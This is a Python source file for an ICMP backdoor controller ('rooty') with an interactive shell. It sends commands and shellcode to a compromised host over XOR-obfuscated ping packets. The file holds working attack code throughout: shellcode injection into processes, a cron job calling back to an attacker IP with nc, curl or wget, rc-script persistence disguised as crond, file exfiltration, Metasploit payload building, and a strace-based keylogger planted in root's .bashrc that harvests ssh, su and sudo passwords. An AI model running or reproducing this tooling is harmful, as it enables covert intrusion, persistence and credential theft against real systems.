from scapy.all import *
import thread
import getopt


######global args#######
cmdout = []
outputdelay = (200.0 / 1000.0)


########## functions ############
def usage():
   print "Usage:"
   print "\tpython %s -i <iface> -d <dst_ip> [-s <src_ip>] [-f <shellcode_file>] [-p <pid>] [-h]" % sys.argv[0]
   print "\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)"
   print "\t\tiface: interface to send from and listen on (Default: eth0)"
   print "\t\tsrc_ip: the address we want to send from (Can be anything)"
   print "\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin"
   print "\t\tpid: inject the given shellcode into the remote process with this PID"
   print
   sys.exit(0)

def parse_args():
   global iface, dst_ip, src_ip, shellcode_file, pid

   try:
      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:p:h', \
         ['interface=', 'destination=', 'source=', 'shellcode=', 'pid=', 'help'])

   except getopt.GetoptError, err:
      print err
      usage()    

   for o, a in opts:
      if o in ('-i', '--interface'):
         iface = a
      if o in ('-d', '--destination'):
         dst_ip = a
      if o in ('-s', '--source'):
         src_ip = a
      if o in ('-f', '--shellcode'):
         shellcode_file = a
      if o in ('-p', '--pid'):
         pid = int(a)
      if o in ('-h', '--help'):
         usage()

def generate_key_info():
   return random.randint(0,65535)

def generate_key(key_info):
   key = [0, 0]

   key[0] = key_info & 0xFF
   key[1] = (key_info >> 8) & 0xFF

   return key


def crypt_data(data, key):
   encrypted_data = ""

   if len(data) < 18:
      data += ("\x00" * (len(data) % 18))

   for c in data:
	   encrypted_data += chr((ord(c) ^ key[0]) ^ key[1])

   return encrypted_data

def build_pkt(src, dst, data, key_info):
   ip = IP(dst=dst)

   if src_ip:
      ip.src = src

   return ip/ICMP(type=8, code=0, id=key_info)/data

def sniff_packet(pkt):
   global magic 

   if ICMP in pkt and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
      data = crypt_data(pkt.load, generate_key(pkt[ICMP].id))

      if data.startswith(magic):
         print data[len(magic) + 1:]

def start_listener(iface, *args):
   sniff(filter="icmp", iface=iface, prn=sniff_packet)

def send_shellcode():
   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, iface, shellcode_file, pid
   shellcode = ''

   if pid != 0:
      shellcode = magic + MSG_TYPE_REMOTE_SHELLCODE + struct.pack('<H', pid)
   else:
      shellcode = magic + MSG_TYPE_SHELLCODE
      
   # Open and read the shellcode
   if shellcode_file == '-':
      shellcode += sys.stdin.read()
   else:
      f = open(shellcode_file, 'r')
      shellcode += f.read()
      f.close()

   # Get the required crypto bits
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(shellcode, key)

   # Now send it
   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)

########### main #############
MSG_TYPE_SHELLCODE = '\x01'
MSG_TYPE_COMMAND = '\x02'
MSG_TYPE_REMOTE_SHELLCODE = '\x03'

magic = "GOATSE"
iface = "eth0"
src_ip = ""
dst_ip = ""
shellcode_file = ""
pid = 0

# We need use rand for key generation
random.seed()

# Parse the arguments
parse_args()

# Make sure we at least have a destination
if dst_ip == "":
   print "ERROR: Destination must be specified"
   usage()
   sys.exit(0)
   
# shellcode is required with a pid
if pid != 0 and shellcode_file == "":
   print "ERROR: You must specify the shellcode to send if specifying a pid"
   usage()
   sys.exit(0)
 
# Do we send shellcode or start a shell
if shellcode_file != "":
	send_shellcode()
	print "Shellcode sent"
	sys.exit(0)

# Create the listener thread
thread.start_new_thread(start_listener, (iface, None))

#Run command, store results in array and return it.
def cmdoutput(line):
   global cmdout
   global outputdelay
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(magic + "\x02" + line, key)
   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
   
   len1 = len(cmdout)
   time.sleep(outputdelay)
   while 1:
      if len(cmdout) != len1:
          len1 = len(cmdout)
          time.sleep(outputdelay)
      else:
          break
      for i in cmdout:
          print i
      orig = []
      for i in cmdout:
         if i.find('\n') > -1:
            new = i.split('\n')
            for x in new:
               orig.append(x)
         else:
            orig.append(i)
      cmdout = []
      return orig

#Same as above, dont output to screen
def cmdoutputnoprint(line):
   global cmdout
   global outputdelay
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(magic + "\x02" + line, key)
   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)

   len1 = len(cmdout)
   time.sleep(outputdelay)
   while 1:
      if len(cmdout) != len1:
          len1 = len(cmdout)
          time.sleep(outputdelay)
      else:
          break
      orig = []
      for i in cmdout:
         if i.find('\n') > -1:
            new = i.split('\n')
            for x in new:
               orig.append(x)
         else:
            orig.append(i)
      cmdout = []
      return orig




import cmd
# Now just read our input and send commands
class Shell(cmd.Cmd):
    last_output = ''

    def default(self, line):
       line = line.rstrip('\n')
       cmdoutput(line) 
       #return cmd.Cmd.default(self, line)
        
    def do_local(self, line):
        "Run a local shell command"
        print "running shell command:", line
        line = line.rstrip('\n')
        output = os.popen(line).read()
        print output

    def do_setdelay(self,line):
        "Set the delay time in seconds for output, when network latency is high, or you expect alot of output"
        line = line.rstrip('\n')
        global outputdelay
        outputdelay = (int(line))
    
    def do_phonehome_install(self, line):
      "Add 15 min cronjob to send GET or keyword to http server, syntax <ip> <port> <keyword> ex phonehome 192.168.1.33 443 hello"
      line = line.rstrip('\n')
      if line == "":
         print "Invalid, example: phonehome 192.168.1.33 GET"
      else:
        linenew = line.split()
        if len(linenew) == 3:
           ip = linenew[0]
           if linenew[1].isdigit():
             port = linenew[1]
           else:
             print "you enter invalid port: defaulting to 443"
             port = "443"
           keyword = linenew[2]
        elif len(linenew) == 2:
           ip = linenew[0]
           if linenew[1].isdigit():
             port = linenew[1]
           print "No Keyword defaulting to GET"
           keyword = "GET"
        else:
           ip = line
           port = "443"
           keyword = "GET"
           print "You did not enter keyword or port, default port 443,  default keyword to GET"
        tools = []
        tools.append(cmdoutput("which nc && echo truenc"))
        tools.append(cmdoutput("which telnet && echo truetelnet"))
        tools.append(cmdoutput("which netcat && echo truenetcat"))
        tools.append(cmdoutput("which curl && echo truecurl"))
        tools.append(cmdoutput("which wget && echo truewget"))
     # tools[5] = cmdoutput("which ping && echo trueiping")
        for i in tools:
         if i != None:
           print i 
           if str(i).find('true') > -1:
               command = ("echo "+keyword+" | "+i[0]+" "+ip+" "+port)
               cron = "crontab -l | { cat; echo \"*/15 * * * * "+command+" >/dev/null 2>&1\"; } | crontab -"
               print "Cron Job Added: "+cron
               cmdoutput(cron)
               break
      


    def do_phonehome_listener_start(self, line):
      "Start an http web server on specfici port, ex phonehome_listener 8080"
      line = line.rstrip('\n')
      if line == "":
         print "No port given, defaulting to port 443"
         line = "443"
      os.system("python -m SimpleHTTPServer "+line+" &> /tmp/.phonehome & echo $! > /tmp/.phonehomepid")
      os.system("cat /tmp/.phonehomepid")
      print "HTTP Server setup, run phonehome_check to verify whos calling back"

    def do_phonehome_listener_stop(self, line):
      "Stop the http web server"
      pid = os.popen("cat /tmp/.phonehomepid").read()
      os.system("kill "+pid)
      print "Phone Home HTTP Server killed"


    def do_phonehome_check(self, line):
      "Check whos calling back, enter an ip/or word you want to filter, or empty for all results"
      line = line.rstrip('\n')
      if line == "":
        os.system("cat /tmp/.phonehome | grep -v syntax")

    def do_phonehome_clear(self,line):
       "Clean the phone home log"
       os.system("echo \"\" > /tmp/.phonehome")
       print "Complete"

      
    def do_getxxd(self, line):
      "Get a File with xxd"
      output = cmdoutput("which xxd && echo true")
      if str(output).find("true") > -1:
         filename = line.split('/')
         filename = filename[len(filename)-1]
         hexfile = cmdoutput("xxd -p "+line)
         print "Lines: "+str(len(hexfile)) 
         f = open("/tmp/.binbin", "w+")
         for line in hexfile:
           f.write(line)
         f.close()
         os.popen("xxd -p -r /tmp/.binbin > ./"+filename).read()
         output = os.popen("ls -latr ./"+filename).read()
         print output
         print "Get File Complete"
      else:
         print "Box does not have xxd, unsupported."

    def do_putxxd(self, line):
      "Upload a File with xxd, file goes to /tmp/.filename"
      output = cmdoutput("which xxd && echo true")
      if str(output).find("true") > -1:
         filename = line.split('/')
         filename = filename[len(filename)-1]
         put = os.popen("xxd -p "+line+"").read()
         puthex = put.split('\n')
      
         for i in puthex:
            cmdoutput("echo "+i+" >> /tmp/.bin")
         cmdoutput("xxd -p -r /tmp/.bin >> /tmp/."+filename)
         cmdoutput("ls -latr /tmp/."+filename)
         cmdoutput("rm /tmp/.bin")
         print "Upload Complete"
      else:
         print "Box does not have xxd, unsupported."

    
    def do_clear(self,line):
       "Clear screen"
       os.system("clear")

    def do_persist(self, line):
      "Create persistence, copy from proc/pid/exe to rcscripts as crond, ex. persist 5141"
      line = line.rstrip('\n')
      if line != "":
        runlevel = cmdoutput("runlevel")
        runlevel = runlevel[0].split(' ')
        runlevel = runlevel[1]
        print "Runlevel is: "+runlevel
        
        rc = cmdoutput("ls /etc/rc"+runlevel+".d/S* && echo true")
        if str(rc).find("true") > -1:
          persistin = "/etc/rc"+runlevel+".d/S48crond"
          print "Persist in: "+persistin
          cmdoutput("cp /proc/"+line+"/exe /bin/crond")
          cmdoutput("echo \"/bin/crond\" \& > "+persistin+" && chmod +x "+persistin)
          cmdoutput("tail "+persistin+" && ls -latr /bin/crond")
      else:
        print "Dude you didnt enter a pid... ex: persist 5141"

    def do_showmyproc(self,line):
      "Display the icmp backdoor process name, may not be accurate..."
      cmdoutput("cat /proc/$PPID/cmdline && echo \" PID: $PPID\"")

    def do_prompt(self, line):
    #Set Prompt by Hostname
      "Set Command Prompt to username@hostname"
      usernametmp  = cmdoutput('whoami')
      username = usernametmp[0]
      hostnametmp = cmdoutput('hostname')
      hostname = hostnametmp[0]
      hostname += (':')
      self.prompt = username +"@"+hostname

    def do_find(self, line):
      "Find a file, enter only find and the filename"
      line = line.rstrip('\n')
      cmdoutput('find / ' + "| grep "+line + "> /tmp/.keyring-2WEFPj" )
      time.sleep(5)
      cmdoutput('cat /tmp/.keyring-2WEFPj')

    def do_msfpayloadbuilder(self, line):
      "Build/Upload Metasploit Payload, Requires MSFPAYLOAD on local box"
      global shellcode_file
      print "Listing all msfpayloads for linux/unix, please wait..."
      while True:
          output = os.popen("msfpayload -l | egrep  \'(linux|unix)\'").read()
          output = output.split('\n')
          payloads = []
          for i in output:
             if "/" not in i:
                continue
             i = i.split()
             payloads.append(i[0])
          count = 1
          for i in payloads:
            print str(count)+" : "+i
            count += 1
          inputnum = raw_input("Pick a Payload Number: ")
          lhost = raw_input("LHOST: ")
          lport = raw_input("LPORT: ")
          print "Building Shellcode Please Wait...."
          print("msfpayload "+payloads[int(inputnum)-1]+" LHOST="+lhost+" LPORT="+lport+" R > /tmp/.shellcode")
          os.system("msfpayload "+payloads[int(inputnum)-1]+" LHOST="+lhost+" LPORT="+lport+" R > /tmp/.shellcode")
          shellcode_file = "/tmp/.shellcode"
          send_shellcode()
          print "Uploading shellcode"
          break
          
    def do_disable_tmpclean(self, line):
       "Disable Tmp directory cleaning after reboot (linux)"
       output = cmdoutput("echo \"\" > /etc/init/mounted-tmp.conf && echo true")
       if "true" in str(output):
          print "Successful"
       else:
          print "Unsuccessful, either permissions or /etc/init/mounted-tmp.conf doesnt exist"

    def do_keylogger_install(self, line):
       "Install Keylogger using strace, add to every users .bashrc"

       output = cmdoutput("echo \"\" > /etc/init/mounted-tmp.conf && echo true")
       if "true" in str(output):
          print "Successful, disabled /tmp/ dir cleaning after reboot."
       else:
          print "Unsuccessful, either permissions or /etc/init/mounted-tmp.conf doesnt exist, be sure to run keylogger_readpasswords often"

       installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
       if "true" in str(installcheck):
         print "Its already installed dude... check the /tmp/.keyring-923q4908afmw/ directory for output"
       else:
          output = cmdoutput("which strace && echo true")
          if "true" in str(output):
             print "Creating Directory /tmp/.keyring-923q4908afmw"
             cmdoutput("mkdir /tmp/.keyring-923q4908afmw && chmod 777 /tmp/.keyring-923q4908afmw/")
             cmdoutput("find /root/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias ssh=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 ssh\'\\\" >> \'{}\'\"")
             cmdoutput("find /root/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias su=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 su\'\\\" >> \'{}\'\"")
             cmdoutput("find /root/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias sudo=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 sudo\'\\\" >> \'{}\'\"")
             #cmdoutput("find /home/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias sssh=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 ssh\'\\\" >> \'{}\'\"")
             #cmdoutput("find /home/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias su=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 su\'\\\" >> \'{}\'\"")
             #cmdoutput("find /home/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias sudo=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 sudo\'\\\" >> \'{}\'\"")
          else:
             print "Sorry Strace is not on the box, upload it yourself  or a real keylogger :("
          print "Installed, check /tmp/.keyring-923q4908afmw/ directory for output"
    


    def do_keylogger_readpasswords(self, line):
       "Parses the collected keylogger data, tries to find passwords based on newlines"
       installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
       if "true" in str(installcheck):
          output = cmdoutputnoprint("cat /tmp/.keyring-923q4908afmw/.* | egrep '(.*write.*password.*|read)'")
          #output check
          if output != None:
             if len(output) > 1:
                os.system('clear')
                for i in output:
 
                   if "password" in i:
                      if len(i) < 200:
                         x = i.split(',')
                         if len(x) > 1:
                            print x[1]
                   if len(i) < 50:
                
                      i = i.split(',')
                      if len(i) > 1:
                         clean = i[1].replace('"','')
                         clean = clean.replace('\\n','  : <---- \\n found Potential Password  or Above ^^^')
                         clean = clean.replace('\\r','')
                         print clean
             else:  "Key keylog data has been found, check back later..."
          else:
              print "No keylog data has been found, check back later..."
       else:
          print "Keylogger data not found... make sure you run keylogger_install"
   

    def do_exit(self, line):
      "Exit the shell"
      print "Good Bye"
      exit(0)

    
if __name__ == '__main__':
  interpreter = Shell()
  l = interpreter.precmd('?')
  r = interpreter.onecmd(l)
  r = interpreter.postcmd(r, l)
  if not r:
     interpreter.cmdloop("ICMP Backdoor (rooty) with Interactive Shell (m0r3sh3lls)")





